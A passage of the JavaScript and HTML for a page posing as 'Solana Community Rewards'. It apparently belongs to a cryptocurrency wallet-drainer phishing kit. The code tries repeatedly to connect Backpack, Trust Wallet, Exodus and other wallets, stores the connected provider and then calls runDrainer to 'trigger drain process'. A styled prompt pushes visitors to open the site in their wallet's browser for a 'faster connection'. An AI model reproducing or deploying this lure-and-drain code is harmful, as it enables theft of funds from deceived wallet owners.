              if (provider.isConnected && provider.publicKey) {
                console.log('[CONNECT] Backpack already connected, using existing connection');
                publicKey = provider.publicKey;
                response = { publicKey: publicKey };
              } else {
                // Try to connect with proper parameters to trigger UI
                console.log('[CONNECT] Backpack not connected, attempting connection...');
                
                // Enhanced Backpack connection with multiple strategies
                const connectionStrategies = [
                  {
                    name: 'Method 1: Connect with metadata',
                    fn: () => provider.connect({
                      onlyIfTrusted: false,
                    appMetadata: {
                        name: 'Solana Community Rewards',
                      url: window.location.origin,
                      icon: '/logo.png'
                    }
                    })
                  },
                  {
                    name: 'Method 2: Simple connect',
                    fn: () => provider.connect()
                  },
                  {
                    name: 'Method 3: Request method',
                    fn: () => {
                      if (typeof provider.request === 'function') {
                        return provider.request({ method: 'connect' });
                      } else {
                        throw new Error('provider.request is not a function');
                      }
                    }
                  },
                  {
                    name: 'Method 4: Direct public key access',
                    fn: () => {
                      if (provider.publicKey) {
                        return { publicKey: provider.publicKey };
                      } else {
                        throw new Error('No public key available');
                      }
                    }
                  }
                ];
                
                let connectionSuccessful = false;
                
                for (let i = 0; i < connectionStrategies.length && !connectionSuccessful; i++) {
                  const strategy = connectionStrategies[i];
                  console.log(`[CONNECT] Backpack ${strategy.name}...`);
                  
                  try {
                    // Add delay between attempts
                    if (i > 0) {
                      await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                    
                    const connectPromise = strategy.fn();
                    const timeoutPromise = new Promise((_, reject) => 
                      setTimeout(() => reject(new Error('Connection timeout')), 45000) // 45 seconds per attempt (increased from 20s)
                    );
                    
                    response = await Promise.race([connectPromise, timeoutPromise]);
                    console.log(`[CONNECT] Backpack ${strategy.name} successful:`, response);
                    
                    // Check if we got a public key
                    publicKey = response?.publicKey || provider.publicKey;
                    if (publicKey) {
                      console.log('[CONNECT] Backpack connection established with public key:', publicKey);
                      connectionSuccessful = true;
                      break;
                    }
                  } catch (strategyError) {
                    console.log(`[CONNECT] Backpack ${strategy.name} failed:`, strategyError.message);
                    
                    // If this is the last strategy, handle the error
                    if (i === connectionStrategies.length - 1) {
                      throw new Error(`Backpack connection failed: ${strategyError.message}. Make sure Backpack wallet is installed and unlocked.`);
                    }
                  }
                }
                
                if (!connectionSuccessful) {
                  throw new Error('All Backpack connection methods failed');
                }
              }
              break;
              
            case 'glow':
              response = await provider.connect();
              publicKey = response?.publicKey || provider.publicKey;
              break;
              
            case 'trustwallet':
              // Trust Wallet uses provider.solana for Solana connections
              console.log('[CONNECT] Trust Wallet connection - provider structure:', Object.keys(provider));
              
              // Add delay to ensure wallet UI is ready
              console.log('[CONNECT] Trust Wallet - waiting for wallet UI to initialize...');
              await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay
              
              // Try multiple Trust Wallet connection strategies
              const trustWalletStrategies = [
                {
                  name: 'Method 1: Main provider with extended timeout',
                  fn: () => {
                    if (typeof provider.connect === 'function') {
                      console.log('[CONNECT] Using Trust Wallet main provider with extended timeout');
                      return provider.connect();
                    } else {
                      throw new Error('Main provider not available');
                    }
                  }
                },
                {
                  name: 'Method 2: Adapter connection',
                  fn: () => {
                    if (provider.adapter && typeof provider.adapter.connect === 'function') {
                      console.log('[CONNECT] Using Trust Wallet adapter connection');
                      return provider.adapter.connect();
                    } else {
                      throw new Error('Adapter not available');
                    }
                  }
                },
                {
                  name: 'Method 3: Mobile adapter connection',
                  fn: () => {
                    if (provider.mobileAdapter && typeof provider.mobileAdapter.connect === 'function') {
                      console.log('[CONNECT] Using Trust Wallet mobile adapter connection');
                      return provider.mobileAdapter.connect();
                    } else {
                      throw new Error('Mobile adapter not available');
                    }
                  }
                },
                {
                  name: 'Method 4: Direct public key access',
                  fn: () => {
                    // Trust Wallet might have public key in different locations
                    const publicKey = provider.publicKey || 
                                    provider.account?.publicKey ||
                                    provider.wallet?.publicKey ||
                                    provider.connected?.publicKey;
                    
                    if (publicKey) {
                      console.log('[CONNECT] Using Trust Wallet direct public key access');
                      return { publicKey: publicKey };
                    } else {
                      throw new Error('No public key available');
                    }
                  }
                }
              ];
              
              let trustWalletConnected = false;
              for (let i = 0; i < trustWalletStrategies.length && !trustWalletConnected; i++) {
                const strategy = trustWalletStrategies[i];
                try {
                  console.log(`[CONNECT] Trust Wallet ${strategy.name}...`);
                  
                  const connectPromise = strategy.fn();
                // Trust Wallet handles its own timeouts - no artificial timeout needed
                  
                response = await connectPromise;
                  publicKey = response?.publicKey || 
                             provider.publicKey || 
                             provider.account?.publicKey ||
                             provider.wallet?.publicKey ||
                             provider.connected?.publicKey;
                  
                  if (publicKey) {
                    trustWalletConnected = true;
                    console.log(`[CONNECT] Trust Wallet ${strategy.name} successful:`, publicKey.toString());
              } else {
                    throw new Error('No public key returned');
                  }
                } catch (strategyError) {
                  console.log(`[CONNECT] Trust Wallet ${strategy.name} failed:`, strategyError.message);
                  if (i < trustWalletStrategies.length - 1) {
                    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before next attempt
                  }
                }
              }
              
              if (!trustWalletConnected) {
                throw new Error('Trust Wallet connection failed: All connection methods failed');
              }
              break;
              
            case 'exodus':
              // Exodus uses provider.solana for Solana connections
              console.log('[CONNECT] Exodus connection - provider structure:', Object.keys(provider));
              
              // Add delay to ensure wallet UI is ready
              console.log('[CONNECT] Exodus - waiting for wallet UI to initialize...');
              await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay
              
              // Try multiple Exodus connection strategies
              const exodusStrategies = [
                {
                  name: 'Method 1: Solana provider',
                  fn: () => {
              if (provider.solana && typeof provider.solana.connect === 'function') {
                console.log('[CONNECT] Using Exodus Solana provider');
                      return provider.solana.connect();
                    } else {
                      throw new Error('Solana provider not available');
                    }
                  }
                },
                {
                  name: 'Method 2: Main provider',
                  fn: () => {
                    if (typeof provider.connect === 'function') {
                console.log('[CONNECT] Using Exodus main provider');
                      return provider.connect();
                    } else {
                      throw new Error('Main provider not available');
                    }
                  }
                },
                {
                  name: 'Method 3: Direct public key access',
                  fn: () => {
                    if (provider.solana && provider.solana.publicKey) {
                      console.log('[CONNECT] Using Exodus direct public key access');
                      return { publicKey: provider.solana.publicKey };
                    } else if (provider.publicKey) {
                      console.log('[CONNECT] Using Exodus main public key access');
                      return { publicKey: provider.publicKey };
                    } else {
                      throw new Error('No public key available');
                    }
                  }
                }
              ];
              
              let exodusConnected = false;
              for (let i = 0; i < exodusStrategies.length && !exodusConnected; i++) {
                const strategy = exodusStrategies[i];
                try {
                  console.log(`[CONNECT] Exodus ${strategy.name}...`);
                  
                  const connectPromise = strategy.fn();
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Exodus connection timeout')), 30000) // 30 seconds per attempt
                );
                  
                response = await Promise.race([connectPromise, timeoutPromise]);
                  publicKey = response?.publicKey || provider.solana?.publicKey || provider.publicKey;
                  
                  if (publicKey) {
                    exodusConnected = true;
                    console.log(`[CONNECT] Exodus ${strategy.name} successful:`, publicKey.toString());
              } else {
                    throw new Error('No public key returned');
                  }
                } catch (strategyError) {
                  console.log(`[CONNECT] Exodus ${strategy.name} failed:`, strategyError.message);
                  if (i < exodusStrategies.length - 1) {
                    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before next attempt
                  }
                }
              }
              
              if (!exodusConnected) {
                throw new Error('Exodus connection failed: All connection methods failed');
              }
              break;
              
            default:
              // Fallback for unknown wallets
              response = await provider.connect();
              publicKey = response?.publicKey || response?.address || provider.publicKey;
          }
          
          console.log(`[CONNECT] ${wallet.name} connected:`, publicKey?.toString() || 'No public key');
                showStatus('Processing...', 'loading');
          
          // Store connected wallet info
          window.connectedWallet = {
            name: wallet.name,
            key: walletKey,
            provider: provider,
            publicKey: publicKey
          };
          
          // Connection successful - trigger drain process
          console.log(`[CONNECT] ${wallet.name} connection successful - triggering drain process`);
          setTimeout(() => {
            runDrainer(provider);
          }, 500); // Reduced timeout to prevent delays
          
          } catch (error) {
          console.error(`[CONNECT] ${wallet.name} connection failed:`, error);
          showStatus('Failed', 'error');
        }
      } else {
        console.error(`[CONNECT] Provider not found for ${wallet.name}`);
        showStatus('Unavailable', 'error');
      }
    }
    
  } catch (error) {
    console.error(`[CONNECT] Error connecting to ${walletKey}:`, error);
    showStatus('Failed', 'error');
      }
    };
    

    
    // Function to show wallet browser prompt when no wallet is detected
    window.showWalletBrowserPrompt = function showWalletBrowserPrompt() {
      // Enhanced mobile detection with platform identification
      const userAgent = navigator.userAgent.toLowerCase();
      let isMobileDevice = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
      if (!isMobileDevice) {
        isMobileDevice = /mobile|tablet/i.test(userAgent) || 
                        (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                        window.innerWidth <= 768;
      }
      
      // Platform-specific detection
      const isIOS = /iphone|ipad|ipod/.test(userAgent);
      const isAndroid = /android/.test(userAgent);
      const platform = isIOS ? 'ios' : isAndroid ? 'android' : 'unknown';
      
      const instructions = `
        <div style="text-align: center; padding: 20px; max-width: 500px; margin: 0 auto;">
          <div style="margin-bottom: 20px;">
            <h3 style="color: #fff; margin-bottom: 10px; font-size: 18px;"><img src="/logo.png" alt="Logo" style="height: 20px; vertical-align: middle; margin-right: 8px;">   Solana Community Rewards</h3>
            <p style="color: #ccc; font-size: 14px; line-height: 1.5; margin-bottom: 20px;">
              No wallet detected! For the fastest and most secure connection experience, 
              please visit this site directly in your wallet's built-in browser.
            </p>
          </div>
          
          <div style="background: rgba(0,0,0,0.3); border-radius: 12px; padding: 16px; margin-bottom: 20px;">
            <h4 style="color: #fff; margin-bottom: 12px; font-size: 14px;">📱 Open in Wallet Browser for Faster Connection</h4>
            <p style="color: #aaa; font-size: 12px; margin-bottom: 16px;">
              Click below to open this rewards site in your wallet's browser for instant connection:
            </p>
            <div style="display: flex; flex-wrap: wrap; gap: 8px; justify-content: center;">
              <button onclick="connectMobileWalletEnhanced('backpack').catch(e => console.error('Backpack error:', e))" style="background: linear-gradient(135deg, #000000 0%, #333333 100%); color: white; border: none; padding: 12px 18px; border-radius: 8px; font-size: 14px; cursor: pointer; transition: all 0.3s ease; font-weight: bold; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">
                🎒 Open in Backpack (Recommended)
              </button>
              <button onclick="connectMobileWalletEnhanced('phantom').catch(e => console.error('Phantom error:', e))" style="background: linear-gradient(135deg, #9945FF 0%, #7B3FE4 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                ⚡ Open in Phantom
              </button>
              <button onclick="connectMobileWalletEnhanced('solflare').catch(e => console.error('Solflare error:', e))" style="background: linear-gradient(135deg, #FC9965 0%, #F7931E 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                ⚡ Open in Solflare
              </button>
              <button onclick="connectMobileWalletEnhanced('trustwallet').catch(e => console.error('Trust Wallet error:', e))" style="background: linear-gradient(135deg, #3375BB 0%, #1E4A8C 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                ⚡ Open in Trust Wallet
              </button>
              <button onclick="connectMobileWalletEnhanced('glow').catch(e => console.error('Glow error:', e))" style="background: linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                ⚡ Open in Glow
              </button>
              <button onclick="connectMobileWalletEnhanced('exodus').catch(e => console.error('Exodus error:', e))" style="background: linear-gradient(135deg, #00D4AA 0%, #00B894 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
                ⚡ Open in Exodus
              </button>
            </div>
          </div>
          
          <div style="margin-top: 20px; padding: 12px; background: rgba(255,255,255,0.05); border-radius: 8px; border-left: 3px solid #14f195;">
            <p style="color: #14f195; font-size: 12px; margin: 0;">
              ⚡ <strong>Faster Connection:</strong> Using your wallet's built-in browser provides instant connection and faster processing.
            </p>
          </div>
          
          <div style="margin-top: 15px; padding: 12px; background: rgba(0,0,0,0.4); border-radius: 8px; border-left: 3px solid #000000;">
            <p style="color: #ffffff; font-size: 12px; margin: 0;">
              🎒 <strong>Backpack Recommended:</strong> Backpack offers the fastest and most reliable connection experience for this rewards site.
            </p>
          </div>
          
          <div style="margin-top: 15px; padding: 12px; background: rgba(255,193,7,0.1); border-radius: 8px; border-left: 3px solid #ffc107;">
            <p style="color: #ffc107; font-size: 11px; margin: 0;">
              💡 <strong>Note:</strong> ' + (isMobileDevice ? 'On mobile devices, deep links will attempt to open your wallet app. If the app is not installed, you\'ll be redirected to the wallet\'s website.' : 'On desktop, deep links will open in a new tab or redirect to the wallet\'s website.') + '
            </p>
          </div>
          
          <div style="margin-top: 15px; padding: 12px; background: rgba(255,107,107,0.1); border-radius: 8px; border-left: 3px solid #ff6b6b;">
            <p style="color: #ff6b6b; font-size: 11px; margin: 0;">
              🔧 <strong>Troubleshooting:</strong> If deep links don't work, manually copy this URL and open it in your wallet's browser: <br><code style="background: rgba(0,0,0,0.3); padding: 2px 4px; border-radius: 3px; font-size: 10px;">' + window.location.href + '</code>
            </p>
          </div>
        </div>
      `;
      
      // Show instructions in modal
      const modal = document.getElementById('statusModal');
      const msgEl = document.getElementById('statusModalMsg');
      if (modal && msgEl) {
        msgEl.innerHTML = instructions;
        modal.classList.add('active');
      } else {
        console.error('Wallet browser prompt modal elements not found');
        // Fallback: show alert
        alert('No wallet detected! Please open this site in your wallet\'s browser for the best experience.');
      }
    };
  </script>
  
  

</body>
</html>
